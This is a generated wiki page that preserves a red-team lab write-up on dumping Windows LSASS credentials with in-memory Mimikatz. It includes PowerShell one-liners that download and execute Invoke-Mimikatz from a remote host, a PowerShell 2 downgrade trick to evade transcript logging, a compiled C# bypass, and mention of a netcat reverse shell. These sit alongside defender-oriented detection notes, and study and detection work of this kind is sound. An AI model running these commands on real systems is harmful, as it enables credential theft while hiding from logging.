---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Dumping Credentials from Lsass Process Memory with Mimikatz

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-credential-access-and-credential-dumping-dumping-credentials-from-lsass.exe-process-memory` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/dumping-credentials-from-lsass.exe-process-memory.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Dumping Credentials from Lsass Process Memory with Mimikatz](../../topics/offensive-security/dumping-credentials-from-lsass-process-memory-with-mimikatz.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-credential-access-and-credential-dumping-dumping-credentials-from-lsass.exe-process-memory |
| name | Dumping Credentials from Lsass Process Memory with Mimikatz |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/credential-access-and-credential-dumping/dumping-credentials-from-lsass.exe-process-memory.md |

## Preserved Source Material

````yaml
_asset_filenames:
- powershell-transcript-logs.png
- pwdump-bypass-no-downgrade.png
- pwdump-mimikatz-results.png
- pwdump-mimikatz-sysmon.png
- pwdump-mimikatz-transcript (1).png
- pwdump-mimikatz.png
- pwdump-powershell-downgrade.png
- pwdump-ps2-no-transcript.png
- pwdump-transcript-cant-start.png
- pwdump-transcript-empty.png
- pwdump-transcript-working.png
_body: "---\ndescription: >-\n  Local Security Authority (LSA) credential dumping with in-memory Mimikatz\n  using powershell.\n\
  ---\n\n# Dumping Credentials from Lsass Process Memory with Mimikatz\n\n## Execution\n\n{% code title=\"attacker@victim\"\
  \ %}\n```csharp\npowershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5/Invoke-Mimikatz.ps1')\
  \ ; Invoke-Mimikatz -DumpCreds\n```\n{% endcode %}\n\nHashes and plain text passwords of the compromised system are dumped\
  \ to the console:\n\n![](../../.gitbook/assets/pwdump-mimikatz-results.png)\n\n## Observations\n\nThe process commandline\
  \ is blatantly showing what is happening in this case, however, you should assume that file names and script argument names\
  \ will be changed/obfuscated by a sophisticated attacker:\n\n![victim host inspection](../../.gitbook/assets/pwdump-mimikatz.png)\n\
  \nAs a defender, if your logs show a script being downloaded and executed in memory in a \"relatively\" short timespan,\
  \ this should raise your suspicion and the host should be investigated further to make sure it is not compromised:\n\n![](../../.gitbook/assets/pwdump-mimikatz-sysmon.png)\n\
  \n### Transcript Logging #1\n\nPowerShell transcript logging should allow you to see the commands entered into the console\
  \ and their outputs, however I got some unexpected results at first.\n\nFor the first test, I setup transcript logging in\
  \ my powershell (version 2.0) profile:\n\n{% code title=\"C:\\Users\\mantvydas\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1\"\
  \ %}\n```bash\nStart-Transcript -Path C:\\transcript.txt\n```\n{% endcode %}\n\n{% hint style=\"warning\" %}\nNote that\
  \ enabling transcription logging is not recommended from powershell profiles, since `powershell -nop` will easily bypass\
  \ this defence - best if logging is enabled via GPOs.\n{% endhint %}\n\n### Cannot Start Transcript\n\nFirst thing I noticed\
  \ was that if at least one powershell instance was already running on the victim system, the transcript could not be started\
  \ (assume because the file is in use already), which makes sense, but is not helpful for the victim at all:\n\n![](../../.gitbook/assets/pwdump-transcript-cant-start.png)\n\
  \nThis could be fixed by amending the PS profile so that the the transcript gets saved to a file the OS chooses itself rather\
  \ than hardcoding it or in other words, doing `Start-Transcript` without specifying the path will do just fine.\n\n### Empty\
  \ Transcript - Weird\n\nBelow shows three windows stacked - top to bottom:&#x20;\n\n1. Attacker's console via a netcat reverse\
  \ shell using cmd.exe, issuing a command to dump credentials with mimikatz powershell script. Note how it says that the\
  \ transcript was started and the mimikatz output follows;\n2. **Empty (!)** transcript logging file transcript.txt on the\
  \ victim system;\n3. Process explorer on the victim system showing the process ancestry of the reverse shell cmd.exe PID\
  \ `616` which had spawned the powershell process (mentioned in point 1) that ran the mimikatz script;\n\n![](../../.gitbook/assets/pwdump-transcript-empty.png)\n\
  \nAs can be seen from the above screenshot, the transcript.txt is empty although mimikatz ran successfully and dumped the\
  \ credentials. \\\n\\\nThis brings up a question if I am doing something wrong or if this is a limitation of some sort in\
  \ transcript logging, so I will be trying to:\n\n* dump credentials from a different process ancestry\n* dump credentials\
  \ locally on the victim system (as if I was doing it via RDP)\n* upgrade powershell to 5.0+\n\n### Dumping Credentials Locally\n\
  \nThis works as expected and the transcript.txt gets populated with mimikatz output:\n\n![](<../../.gitbook/assets/pwdump-mimikatz-transcript\
  \ (1).png>)\n\n### Dumping Credentials From a Different Process Ancestry\n\nTried dumping creds from the ancestry: \\\n\
  `powershell > nc > cmd > powershell` instead of `cmd > nc > cmd > powershell` - to no avail.\n\n### Transcript Logging #2\n\
  \nI have updated my Powershell version from 2.0 to 5.1 and repeated credential dumping remotely `(cmd > nc > cmd > powershell)`\
  \ process ancestry, same like the first time, where the transcript.txt came back empty. This time, however, the results\
  \ are different - the output is logged this time:\n\n![Powershell 5.1 transcribing powershell console remotely with no issues](../../.gitbook/assets/pwdump-transcript-working.png)\n\
  \n### Back to PowerShell 2.0\n\nEven though the victim system now has Powershell 5.0 that is capable of transcript logging,\
  \ we can abuse the `-version 2` switch of the powershell.exe binary like so:&#x20;\n\n```bash\npowershell -version 2 IEX\
  \ (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds\n\
  ```\n\n&#x20;... and the transcript will again become useless:\n\n![](../../.gitbook/assets/pwdump-ps2-no-transcript.png)\n\
  \nThis abuse, however, allows defenders to look for logs showing commandline arguments that suggest powershell is being\
  \ downgraded and flag them as suspicious activity:\n\n![](../../.gitbook/assets/pwdump-powershell-downgrade.png)\n\n###\
  \ Bypassing w/o Downgrading\n\nAnother technique allowing to bypass the transcript logging without downgrading is possible\
  \ by using a compiled c# program by [Ben Turner](https://gist.githubusercontent.com/benpturner/d62eb027a518b3743520a34d3aecb915/raw/32d96dafe148c784706b0dc7ed1d0fbbab51c354/posh.cs):\n\
  \n{% file src=\"../../.gitbook/assets/posh.cs\" %}\nTranscript Bypass without Downgrade - C#\n{% endfile %}\n\nCompile the\
  \ code .cs code:\n\n```csharp\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:C:\\experimemts\\transcript-bypass\\\
  bypass.exe C:\\experiments\\transcript-bypass.cs /reference:System.Management.Automation.dll\n```\n\nIf you are having problems\
  \ locating the `System.Management.Automation.dll` - you can find its location by using powershell: `PS C:\\Users\\mantvydas>\
  \ [psobject].assembly.location`\n\nWe can then launch the transcript-bypass and use powershell and not worry about the transcript,\
  \ because although the file will be created, it will be showing this:\n\n![](../../.gitbook/assets/pwdump-bypass-no-downgrade.png)\n\
  \nI wanted to check if I could find any traces of non-powershell.exe processes creating transcript files in the logs, so\
  \ I updated the sysmon config:\n\n{% code title=\"sysmonconfig.xml\" %}\n```markup\n<FileCreate onmatch=\"include\">\n \
  \   <TargetFilename condition=\"end with\">.txt</TargetFilename>\n</FileCreate>\n```\n{% endcode %}\n\n...and while I could\
  \ see powershell.exe creating transcript files:\n\n![](../../.gitbook/assets/powershell-transcript-logs.png)\n\nI could\
  \ not get sysmon to log the transcript.txt file creation event caused by the `bypass.exe` although the file got successfully\
  \ created!\n\n## References\n\n{% embed url=\"https://attack.mitre.org/wiki/Technique/T1003\" %}\n\n{% embed url=\"https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html\"\
  \ %}"
_relative_path: offensive-security/credential-access-and-credential-dumping/dumping-credentials-from-lsass.exe-process-memory.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/dumping-credentials-from-lsass.exe-process-memory.md
````
